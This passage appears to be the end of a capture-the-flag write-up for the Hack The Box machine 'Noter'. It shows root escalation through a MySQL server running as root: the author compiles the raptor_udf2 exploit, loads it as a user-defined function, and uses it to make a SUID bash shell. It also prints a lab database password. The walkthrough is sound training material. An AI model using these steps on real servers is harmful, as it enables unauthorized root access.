svc        12936  0.0  0.0  10612  3320 pts/0    R+   19:49   0:00 ps auxww

```

Nothing interesting there. `/proc` is mounted with `hidepid=2`. To see what else might be running, I’ll look in `/etc/systemd` to look for services. There’s a lot here. I’ll start with MySQL, since I know that’s running:

```

svc@noter:/etc/systemd$ find . -name '*.service' | grep sql
./system/multi-user.target.wants/mysqlcheck.service
./system/multi-user.target.wants/mysql-start.service
./system/mysqlcheck.service
./system/mysql-start.service

```

`mysql-start.service` shows that the service is running as root:

```

[Unit]
Description=MySQL service

[Service]
ExecStart=/usr/sbin/mysqld
User=root
Group=root

[Install]
WantedBy=multi-user.target

```

### Raptor

#### Stage Exploit

There’s a bunch of [posts](https://medium.com/r3d-buck3t/privilege-escalation-with-mysql-user-defined-functions-996ef7d5ceaf) out there about how to exploit MySQL running as root using some code referred to as Raptor. The idea is that I’ll write a shared library that runs commands from SQL into the plugins directory, and then add a command to access it and get execution as root.

I’ll need to get a copy of the [exploit file](https://www.exploit-db.com/raw/1518) and compile it using the instructions in the comments:

```

oxdf@hacky$ wget https://www.exploit-db.com/raw/1518 -O raptor_udf2.c
--2022-03-30 15:53:51--  https://www.exploit-db.com/raw/1518
Resolving www.exploit-db.com (www.exploit-db.com)... 192.124.249.13
Connecting to www.exploit-db.com (www.exploit-db.com)|192.124.249.13|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3378 (3.3K) [text/plain]
Saving to: ‘raptor_udf2.c’

raptor_udf2.c                                        100%[=====================================================================================================================>]   3.30K  --.-KB/s    in 0s      

2022-03-30 15:53:51 (1.53 GB/s) - ‘raptor_udf2.c’ saved [3378/3378]
oxdf@hacky$ gcc -g -c raptor_udf2.c
oxdf@hacky$ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc

```

Now I’ll upload that to Noter into `/dev/shm`.

#### Load Library

I’ll connect to MySQL as root, not as DB\_user (that user lacks privs), and using the `mysql` db:

```

svc@noter:/dev/shm$ mysql -u root -pNildogg36 mysql
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 11402
Server version: 10.3.34-MariaDB-0ubuntu0.20.04.1 Ubuntu 20.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [mysql]> 

```

I’ll create a `foo` table and read the binary into it:

```

MariaDB [mysql]> create table foo(line blob);
Query OK, 0 rows affected (0.007 sec)

MariaDB [mysql]> insert into foo values(load_file('/dev/shm/raptor_udf2.so'));
Query OK, 1 row affected (0.002 sec)

```

Next I need to know the plugins directory:

```

MariaDB [mysql]> show variables like '%plugin%';
+-----------------+---------------------------------------------+
| Variable_name   | Value                                       |
+-----------------+---------------------------------------------+
| plugin_dir      | /usr/lib/x86_64-linux-gnu/mariadb19/plugin/ |
| plugin_maturity | gamma                                       |
+-----------------+---------------------------------------------+
2 rows in set (0.001 sec)

```

I’ll write that binary out into the plugins directory above, and load it as a user defined function:

```

MariaDB [mysql]> select * from foo into dumpfile '/usr/lib/x86_64-linux-gnu/mariadb19/plugin/raptor_udf2.so'; 
Query OK, 1 row affected (0.000 sec)
MariaDB [mysql]> create function do_system returns integer soname 'raptor_udf2.so';
Query OK, 0 rows affected (0.001 sec)

```

To test it, I’ll use the function to run `id` and write the result into a file. I’ll make sure to change the perms on the file so I can read it:

```

MariaDB [mysql]> select do_system('id > /dev/shm/0xdf; chmod 777 /dev/shm/0xdf');
+----------------------------------------------------------+
| do_system('id > /dev/shm/0xdf; chmod 777 /dev/shm/0xdf') |
+----------------------------------------------------------+
|                                                        0 |
+----------------------------------------------------------+
1 row in set (0.005 sec)

```

The output in `mysql` isn’t useful, but the file is there, and it was run by root:

```

svc@noter:/dev/shm$ ls -l 0xdf 
-rwxrwxrwx 1 root root 39 Mar 30 21:08 0xdf
svc@noter:/dev/shm$ cat 0xdf 
uid=0(root) gid=0(root) groups=0(root)

```

### Shell

To get a shell, I’ll drop back into `mysql` and copy `bash` and change it to be SUID:

```

MariaDB [mysql]> select do_system('cp /bin/bash /tmp/0xdf; chmod 4777 /tmp/0xdf');
+-----------------------------------------------------------+
| do_system('cp /bin/bash /tmp/0xdf; chmod 4777 /tmp/0xdf') |
+-----------------------------------------------------------+
|                                                         0 |
+-----------------------------------------------------------+
1 row in set (0.006 sec)

```

I’ll need to find somewhere to work that’s not `/dev/shm`, as that’s mounted `nosuid`:

```

svc@noter:/dev/shm$ mount | grep shm
tmpfs on /dev/shm type tmpfs (rw,nosuid,nodev)

```

`/tmp` will work fine.

Because of how `bash` drops privs, running this will return a non-root shell:

```

svc@noter:/dev/shm$ /tmp/0xdf
0xdf-5.0$

```

Exiting from that and re-running with `-p` will give root:

```

svc@noter:/dev/shm$ /tmp/0xdf -p
0xdf-5.0# id
uid=1001(svc) gid=1001(svc) euid=0(root) groups=1001(svc)

```

From here, I can read `root.txt`:

```

0xdf-5.0# cat root.txt
1be965e2************************

```

[Alternative Noter Root »](/2022/09/28/htb-noter-alternative-root-first-blood.html)